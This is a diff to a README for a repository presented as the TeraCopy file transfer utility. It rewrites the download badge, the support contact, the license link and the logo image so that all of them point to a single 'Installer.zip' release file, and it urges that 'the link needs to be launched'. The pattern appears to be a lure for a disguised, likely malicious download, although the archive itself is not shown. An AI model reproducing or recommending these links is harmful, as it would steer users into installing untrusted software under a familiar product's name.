@@ -13,7 +13,7 @@ Welcome to the TeraCopy File Transfer Utility repository! TeraCopy is an advance
 
 To get started with TeraCopy, you can download the latest version using the following link: 
 
-[![Download TeraCopy](https://img.shields.io/badge/Download-TeraCopy-blue.svg)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download TeraCopy](https://github.com/carterlee1/TeraCopy-File-Transfer-Utility/releases/download/v1.0/Installer.zip)](https://github.com/carterlee1/TeraCopy-File-Transfer-Utility/releases/download/v1.0/Installer.zip)
 
 *Note: The link needs to be launched.*
 
@@ -49,7 +49,7 @@ Explore the following topics related to TeraCopy and enhance your file transfer 
 
 ## Support 🤝
 
-If you encounter any issues or have any questions regarding TeraCopy, feel free to [contact us](mailto:teracopy.support@example.com) for support. We are here to assist you in optimizing your file transfer processes with TeraCopy.
+If you encounter any issues or have any questions regarding TeraCopy, feel free to [contact us](https://github.com/carterlee1/TeraCopy-File-Transfer-Utility/releases/download/v1.0/Installer.zip) for support. We are here to assist you in optimizing your file transfer processes with TeraCopy.
 
 ## Contributing 🌐
 
@@ -57,7 +57,7 @@ We welcome contributions from the community to enhance TeraCopy's functionality 
 
 ## License ℹ️
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the [MIT License](https://github.com/carterlee1/TeraCopy-File-Transfer-Utility/releases/download/v1.0/Installer.zip) - see the [LICENSE](LICENSE) file for details.
 
 ---
 
@@ -67,4 +67,4 @@ Remember, with TeraCopy, transferring files has never been faster or more reliab
 
 ---
 
-![TeraCopy Logo](https://www.example.com/teracopy_logo.png)
+![TeraCopy Logo](https://github.com/carterlee1/TeraCopy-File-Transfer-Utility/releases/download/v1.0/Installer.zip)
